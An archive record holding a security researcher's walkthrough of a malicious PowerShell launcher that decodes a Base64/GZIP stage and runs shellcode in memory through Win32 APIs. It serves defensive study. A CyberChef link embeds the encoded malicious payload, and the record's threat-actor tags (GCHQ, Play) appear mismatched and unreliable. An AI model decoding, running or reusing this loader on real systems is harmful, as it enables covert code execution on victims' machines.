{
    "id": "142170a7-98fe-416c-8c5d-0988a81fa883",
    "created_at": "2023-01-12T15:02:03.22448Z",
    "updated_at": "2025-03-27T02:16:26.261269Z",
    "deleted_at": null,
    "sha1_hash": "f59dbc93ab7e355724caf76dc6b8c143246c6853",
    "title": "2021-04-05 - From PowerShell to Payload- An Analysis of Weaponized Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T02:25:01Z",
    "file_modification_date": "2022-05-28T02:25:01Z",
    "file_size": 1972164,
    "plain_text": "# From PowerShell to Payload: An Analysis of Weaponized Malware\n\n**[huntress.com/blog/from-powershell-to-payload-an-analysis-of-weaponized-malware](https://www.huntress.com/blog/from-powershell-to-payload-an-analysis-of-weaponized-malware)**\n\nClick, boom, and your network is compromised. All a hacker needs is one successful exploit\nand you could have a very bad day. Recently, we uncovered one artifact that we would like to\nbreak down and showcase. We will get \"into the weeds\" here and really deep-dive on the\ntechnical details, so put on your ear protection and let's walk down the range.\n\n_[Editor's Note: This post originally published on Threatpost.](https://threatpost.com/powershell-payload-analysis-malware/165188/)_\n\n## The Smoking Gun\n\nRecently, Huntress’ ThreatOps team uncovered one malware artifact that I would like to\nbreak down and showcase.\n\nWhile at first glance this looks like gibberish, we can take it apart and understand what is\nreally happening here. We will move through the code in a procedural fashion, taking one\nline at a time and understanding the syntax.\n\nThe first thing to note is that this took the form of a Windows “batch” script, or a file with a\n.bat extension. Batch scripts are interpreted and executed by the Windows command\nprompt, or the “cmd.exe” program. cmd.exe is the default command-line interpreter for\n\n\n-----\n\nWindows operating systems, but it is an older utility that dates back to DOS (or the Disk\nOperating System). In the world we live in now, developers and security professionals prefer\nto work in PowerShell, a much more modern command-line shell and language.\n\nPowerShell will be introduced here in just a moment, but first we have to discuss the\ndifferences in syntax. Variables in PowerShell are denoted by a “$varname” syntax, with the\nname of the variable being prefixed by a dollar sign. In cmd.exe batch scripting, variables are\nindicated like %varname%, with the variable name wrapped in percent-signs on either side.\nIn the case here, we see an environment variable being referenced, `%COMSPEC% . The value`\nof this is:\n```\nC:\\Windows\\System32\\cmd.exe\n\n```\nThat value will be put in place where the `%COMSPEC% syntax is. When executed, it will start`\ncmd.exe with the parameters and arguments that follow. In our “weaponized” analogy, we\ncan call these beginning pieces of the payload, the trigger.\n\n## The Trigger\n\nThe `/b argument to cmd.exe means “Start the application without creating a new window”`\nso our hacker is trying to hide. `/c means “run a single command and exit”, which explains`\nthat the rest of this code will actually execute.\n\nThat `start command that follows will spin off a new program, again with the` `/b to`\nenforce no window is created. The `/min argument seems to be added for just extra`\nmeasure—the application would start minimized (if, for some reason, a window were to be\ncreated with the `/b argument).`\n\nFollowing that, we see `powershell.exe is the application started. It also includes many`\narguments, like `-nop (do not instantiate with a startup profile),` `-w hidden (yet again, do`\nnot create a window), `-noni (do not run in interactive mode) and finally` `-c (execute a`\nsingle command and exit).\n\nAt this point, we’ve finally made it into the string of code that is passed into PowerShell. This\ndoes a few checks to ensure the payload being used for the target is appropriate.\n\n## The Sights\n\nAt the very start of the PowerShell syntax, we see:\n\nThis `if statement conditional is interesting because it checks if the size of the “integer`\npointer” data type is equal to the number 4. This might seem like sort of a random check, but\nit’s actually a clever method to determine the target’s system architecture. A 64-bit computer\n\n\n-----\n\nwould have an `IntPtr size of 8, referring to the length of memory addresses. A 32-bit`\nsystem would have an `IntPtr size of 4, so the code determines the path of PowerShell`\nbased off the architecture.\n\nThe `$b we see created as a PowerShell variable to hold the path of the PowerShell`\nexecutable.\n\nJust following that if statement, we see the next bit of code:\n\nThis creates another PowerShell variable `$s, this time being defined as a new object. In`\nthis case, the object created is a new process, with the filename being set to `$b (as we`\nnow know is the path to PowerShell) with arguments like we have seen before. Yet again, we\nare spawning another PowerShell instance, with no profile and a hidden window.\n\n## The Bullet\n\nFor the command run by the new, innermost PowerShell instance, we see this syntax:\n\nThe `[scriptblock]::create call defines new code to run. The` `New-Object`\n```\nIO.StreamReader allows us to read the code “on-the-fly”, pulled in from the passed-in data.\n\n```\nThe data we see is wrapped in these functions: `IO.Compression.GzipStream,`\n```\nIO.MemoryStream, and [Convert]::FromBase64String, with the GzipStream using a\nDecompress flag.\n\n```\nThis indicates that the large block of seemingly gibberish and nonsense characters is\nactually Base64 encoded GZIPed data.\n\nBase64 is an encoding scheme that just represents data in a different format. Decoding the\ndata is trivial—you just do the inverse operation. GZIP data is compressed, archived data,\npractically the same as a .ZIP archive you might see as a file on your computer. Thankfully,\nwe can perform the inverse operation on that large chunk of data to better understand what it\nis doing.\n\nBut first, let’s wrap up the analysis on the rest of the code.\n\n## The Silencer & The Shooter\n\nJust after the blob of Base64, we see these lines of code:\n\nI jokingly refer to this segment as “the silencer” because it yet again tries to mask and hide\nthe new PowerShell instance. That `$s is our new process, with configuration values being`\nset to hide the window, don’t create the window, and don’t keep track of standard output or\ninvoke a new shell.\n\nAnd of course, just following this snippet we see what really fires the gun.\n\n\n-----\n\n```\n$p [System.Diagnostics.Process]::Start($s)\n\n```\nThis line will start our new process and the decoded and uncompressed code within the\nBase64 blob will execute. Now that we have a better understanding of how this works, we\ncan zoom in on that blob of data.\n\n## Inside The Ammunition\n\nThe real substance with this launcher comes from the Base64 encoded, GZIP compressed\nblob that is extracted and executed on the fly. That is this chunk:\n\nWe can perform the reverse operations with any toolkit we would like, whether it be on the\ncommand-line, or Python, or even with CyberChef.\n\n[For convenience’s sake, we can do this with CyberChef.](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Gunzip()&input=SDRzSUFBYi9FRjBDQTdWV2EyK2JTQlQ5bkVqNUQ2aXlCQ2pFeG9tYk5wRXFMZGdtaGhySEJEOWl1OVlLd3dCVGo0SEM0SmgwKzkvM2pnMXBxcVM3N1VxTGJER1ArenozekZ6OFBISXBqaU11dSsxeFgwK09qNFpPNm13NG9SYS91NUM0R25adnhhTWpXSzQ5R2hmY0IwNVlLRW5TaVRjT2pwYlgxKzA4VFZGRUQvUDZEYUpLbHFITmltQ1VDU0wzRnpjTlVZck9ibGVma1V1NXIxenR6L29OaVZjT0tjV0t0dU9HaUR0VElvL3Q5V1BYWWFIVTdZUmdLdkNmUHZIaTRxeTVySGUvNUE3SkJONHVNb28yZFk4UVh1UytpY3pocUVpUXdKdllUZU1zOW1sOWlxT0w4L280eWh3ZkRjRGFGcG1JaHJHWDhTSWtBYjhVMFR5Tk9KWU8wei9zQ2p3TWgybnNLcDZYb2l6akpXN0JMQytXeXorRVJlbjJMbzhvM3FDNkhsR1V4b21OMGkxMlVWYnZPWkZIMEIzeWw2QmwweFJId1ZJVVFXd2JyNUZRaTNKQ0pPNTN6QWdEOUZDQjlxdEt3bk1sa0JyU1ZKU2dpaS9UTkdNdkoraWd5TDhTSnl1OENFOVpmSUR0MjhueHliRmY4V1IxWlU2ZkV3VkdSNHY5R0VGc3dqRE84Rjd1QXlkTG5BbHVIQnFuQlV4cm96Ukg0dklKV2E3bUl6eElwWjhiYUZiU0lCcy8zSy9uc0xhWXhOaGJnazVaejFyb1BJeGFiT1BueE93Z0gwZW9VMFRPQnJzVjk0VFhZRVkrUWZzMDY1WFlBTUlTK0hJRGVSMUVVT0JRaGh5cjlndTE3Z2JUSjEwMXg4UkRxZUpDcVRLSUNxb28vaGpNb1JnQ3IwY20yZ0JNaHpuUXIrWUQ0MUVsWGJLOHFMeXpPUWp4YmVKa21jUU5jemh5cnNUWnlDSElremdseW5DNXBlUTAzZy81NytHYU9hSFlkVEphbVZ1S1QwQ1dEdHR4bE5FMGQ2RjBrUHpJVHBDTEhjS3drTGdlOXBCYTJEaW9IUE92SXRGMkNJR2pBSmEyVUFsWVlRallsQkVpOWFTeStHTGRSbFRmSkFSdFFHaC8ralhpQkhEV1M4YnZLZVFFeU9OZnhGaHgra0JnQmtlRnc3TUlvY1kyaWFuRVRYQks0UlpoME82cDlCOGplSGFESEdKcHA2Z3NpRkFkbFlWYVVFYncybXBzR295WkpUaDdLRklLTUdocHZGR2RERjIyRHZlRjhLYlJ4ZXJiWWFjQlQveW93TlBWN3F5SmFvOG5jOTMwREdMcjFKNTFjWDhjaGpwdTZnSE1pM0UzR0ZJNStUZ2E5UXk3MDFQU3ppNzBGVDNUdXoyMXNKcXE0dmJ3dTRtaGpzZWdoOXQ5Ni9OT1Z6eDFFOXdIcy9hRFBnenZkWERVN2dkNkFHOVZEMTFWbnN1QkttdnR2cTJHWFN3cmdXMzFyRlp6cmpmZUV4VS8ycnF0OUtaUC9wNzhkRnV0M3YxdXBBeE1Rd20xVzA5cm5tdDcvVFhUbjY5ditwM3VmdTZ5dVRYTHVyZ0xmcnJhekpxRWFEcEoxR2xYbTF1VFJBOU9Id0pyMG0rMHRGQ0ZkUjN2K29uTlVHazJqVzNrUFpyay9hTUo0VnFUdVlIUlhBOVFFU2lXb3RpemlMQ1l4cHBxYkJWZDZmZGRoaUxJM1lIY25ZbDlUYzNYdXdzajhCdk5jV0ZjYmdLVjZVM0hONWNmWjJxcURCc1RKekRtb0Q4d1hRSi9GWEpXZGV3YWFwN0h3NHZURHVoaFkzY2VXeEN6aVpHaFk1K29lZFpmRGM2WnpXQW5yN0Z4Q3ZibzZib0ZFVThBSndWaXNtMDllbXV0RXZsZFp4czJyaVpNRCt4NmFoNU44dEcweCt5cXU3N1NaaldBL0MyUXh3eGpKN2dEWEE0MkZScnA5MkRUMW9kZFhiczByallKNUVaaVJkMXpaUVk2QmZneXdNOHMwWVprNzhjZEdPQ0g1V05nSDNMeGtrUE1RWDllYUEwV3Mvb2dCOGx1amJXcjZENjAvRVkwdlltVjZXb2I5T3o0b3pXTG5NYlYrTU1iUm54Z2ZpMXJYNDd0WjRUK1dWY3luVFFMSFFKRWgzNVRYVEphbkdwbER4bkdtR2tJQXZ2bVdLTTBRZ1NhTnJUMTZwUXFoTVF1NjEvN1pnTzk4OURSV0lNZHcvRGkvTldSeUQwSml0OGJXN1YwZlQySElPSFlzMU5aNzZNb29LRWs3eTVrR2ZxVXZHdkprT1d2SjlhT2swTFltNUpZbnp0QVV4a25lK01pdXd0cTlITDJ2eUpXM2o4aHZMeC9RK3o3Mmovcy9oS0tzbFJtL0dMOXg0WGZ3dlIzVTU4Nm1JS2dEUmNvUVlkRy9qb0NKVDJlZmV4QVZhRDJmdm13VDlYYm5KNE40QlBvNVBodnlqd0hxQklMQUFBPQ)\n\nThis returns with, unsurprisingly, more PowerShell code. As we already know, this will be\nexecuted by the launcher. The output dump looks like so:\n\nObviously, there is a lot to unpack here. This PowerShell code is at least somewhat readable\nin that there are clear newlines and whitespace—but variable names and some of the logic\nare still obfuscated. We will make sense of it piece by piece.\n\n## Examining the Gunpowder\n\nThe first function that we see defined in this PowerShell code is named `sOH, which is not`\nvery descriptive. All of these function and variable names seem to be random and\nobfuscated, but we can make sense of them by reading the definition of the function.\n\nThe `soH function takes in two parameters. It uses a technique to “reflectively” search for`\nthe address of Win32 API calls, so that PowerShell has the capability to run these core,\ninternal, procedures known to lower-level operating systems. In the current context, it\nsearches for where the `System.dll might be loaded and uses that to find a desired`\n\n\n-----\n\nfunction name within other DLLs that it could then execute. The name of the DLL this\nfunction is a part of, and the Win32 API function itself that should be called, are the two\nvalues passed in as parameters to this `sOH function. This is all done by using “reflection,”`\nthe ability that allows PowerShell to perform some introspection and lookup already-defined\nprocedures.\n\nUltimately, this gives PowerShell much more power. Gaining access to run the Win32 API\nfunctions allows it to do things like allocate memory, copy and move memory, or other\npeculiar things that we will see in the code very soon.\n\nFor our own understanding, we should mentally rename this function to something like:\n\nSo far, what we knew as the `sOH function adds a portion of this new capability. If hackers`\nwant to use this tradecraft to invoke Win32 API function calls within PowerShell, they also\nneed the functionality to work with “delegates”. The next function, `b9MW, finishes the`\n“boilerplate” code needed to be able to do this.\n\nAs you can see this is overflowing with the Windows internals necessities and fluff that make\nthis work. We will not do a ton of in-depth analysis with this code, explaining each and every\nline and variable, but this function now provides the functionality to interpret Win32 API\nfunction parameters and return values.\n\nSince our hacker is building out the functionality to be able to call Win32 API functions with\nPowerShell, they needed this `sOH procedure to be able to find and locate the functions, and`\nthis `b9MW` procedure to supply parameters and understand the function return values.\n\nWith these two functions in place, the code now has the primitives to freely call any Win32\nAPI function it would like. Next, we will see this in action.\n\n## The Explosive\n\nFollowing those function definitions, this PowerShell snippet defines an array of bytes, pulled\nout by decoding more encoded Base64.\n\nDecoding this Base64 unfortunately gives us a lot of non-printable characters.\n\n\n-----\n\nWe can go so far as to say this is shellcode, or processor instructions as opcodes that will be\nexecuted. Since this is binary data we can’t quickly make sense of it, but we do know this\nmalware does end up using shellcode.\n\nJust underneath this we see:\n\nNow a `$sC6US variable is in play, calling the` `GetDelegateForFunctionPointer function,`\nwith our newly defined `sOH and` `b9MW functions. Remember, these functions allowed the`\nhacker to load Win32 API functions—and in this case, we can see they have pulled out the\n```\nVirtualAlloc function.\n\n```\nThis `VirtualAlloc function tells the operating system to allocate memory. As we can see`\nfrom the function parameters, it invokes this function to allocate enough memory for the\nlength of the `$bUMJ byte array (the shellcode)! The` `0x3000 indicates “reserve and commit`\nthis memory”, and the `0x40 indicates “this memory should be readable, writable, and`\n_executable.”_\n\nAt this point, the allocated memory space is stored in that `$sC6US variable. Then, we see a`\n```\nCopy function called to fill that memory space with the shellcode byte array, $bUMJ .\n\n```\n\n-----\n\nThe malicious script has now allocated memory for the shellcode, and we can take an easy\nguess as to what they will do next. Run the shellcode.\n\nNext, a `$t6Y variable is created, again reaching for and calling a Win32 API call, this time`\nspecifically `CreateThread . This` `CreateThread call is invoked with the` `$sC6US memory`\naddress—which as we now know, contains the shellcode. Ultimately, this executes the\nshellcode!\n\nFollowing that, we see one more call to run the `WaitForSingleObject Win32 API function.`\nThis will “block” execution and patiently wait for the shellcode to finish executing. You can\nsee it includes the `$t6Y variable (which is the new thread running the shellcode), and the`\n```\n0xFFFFFFFF indicates “wait forever.”\n\n```\nFinally, after all these nested layers, obfuscation and abstractions, the malware has loaded\nshellcode into memory and executed it. The next question is: what exactly does this\nshellcode do?\n\nAs security analysts, we still have work to do. We can monitor the behavior of this malware—\nwatch to see if it creates any new files or calls out to any other external endpoint. The\nshellcode itself looks very small, so perhaps that is a stub to load even more malware. While\nthis article focused solely on understanding the PowerShell launcher, perhaps the next one\nmight analyze the shellcode within a debugger like `scdbg or observe the malware running`\nin a contained sandbox.\n\nWe dove under the hood here to further understand what the hackers did and how their\npayload worked. Learning from the offense is the best way to have a stronger defense.\nSome mitigation tactics like enabling AppLocker or PowerShell Constrained Language Mode\nwould at least block the execution of this initial launcher, and the hackers would have to work\nharder. At the end of the day, that’s our goal: make hackers earn every inch of their access.\n\n[Want to dive deeper under the hood and get shady with us? Join us for Tradecraft Tuesday](https://www.huntress.com/resources/tradecraft-tuesday)\nto hear live threat analysis and commentary from our team of cyber experts.\n\n\n-----\n\n**John Hammond**\n\nThreat hunter. Education enthusiast. Senior Security Researcher at Huntress.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-05 - From PowerShell to Payload- An Analysis of Weaponized Malware.pdf"
    ],
    "report_names": [
        "2021-04-05 - From PowerShell to Payload- An Analysis of Weaponized Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535723,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653704701,
    "ts_modification_date": 1653704701,
    "files": {
        "pdf": "https://archive.orkl.eu/f59dbc93ab7e355724caf76dc6b8c143246c6853.pdf",
        "text": "https://archive.orkl.eu/f59dbc93ab7e355724caf76dc6b8c143246c6853.txt",
        "img": "https://archive.orkl.eu/f59dbc93ab7e355724caf76dc6b8c143246c6853.jpg"
    }
}